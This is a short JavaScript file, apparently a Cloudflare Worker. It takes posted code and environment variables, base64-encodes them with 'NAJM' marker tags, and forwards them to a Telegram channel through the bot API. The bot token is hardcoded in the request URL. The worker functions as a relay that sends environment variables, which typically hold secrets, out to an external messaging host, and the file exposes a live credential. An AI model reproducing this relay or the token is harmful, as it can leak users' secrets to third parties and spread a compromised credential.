export default {
  async fetch(request, env) {
    const headers = { 
      "Access-Control-Allow-Origin": "*", 
      "Access-Control-Allow-Headers": "Content-Type", 
      "Access-Control-Allow-Methods": "POST, OPTIONS" 
    };
    
    if (request.method === "OPTIONS") {
      return new Response(null, { headers });
    }
    
    try {
      const data = await request.json();
      const { user_id, project_name, code, environment_variables } = data;

      // ========== v15.0 UNIFIED PROTOCOL ==========
      const payloadObject = {
        code: code,
        vars: environment_variables,
        timestamp: Date.now(),
        version: "15.0"
      };
      
      const payloadJson = JSON.stringify(payloadObject);
      const base64Payload = btoa(unescape(encodeURIComponent(payloadJson)));
      
      const dataRecord = [
        `[NAJM_ID:${user_id}]`,
        `[NAJM_PRJ:${project_name}]`,
        `[NAJM_PAYLOAD_START]`,
        `${base64Payload}`,
        `[NAJM_PAYLOAD_END]`
      ].join('\n');

      const telegramResponse = await fetch(`https://api.telegram.org/bot8683006680:AAGUqsPrC76xKnUgAep3tigtGVXsLKc86mI/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ 
          chat_id: "@nejm_njm", 
          text: dataRecord,
          disable_web_page_preview: true,
          disable_notification: false
        })
      });

      const telegramResult = await telegramResponse.json();
      
      if (!telegramResult.ok) {
        throw new Error(`Telegram API error: ${telegramResult.description}`);
      }

      return new Response(JSON.stringify({ 
        success: true, 
        message_id: telegramResult.result.message_id 
      }), { headers });
      
    } catch (e) {
      return new Response(JSON.stringify({ 
        error: e.message,
        success: false 
      }), { status: 500, headers });
    }
  }
};
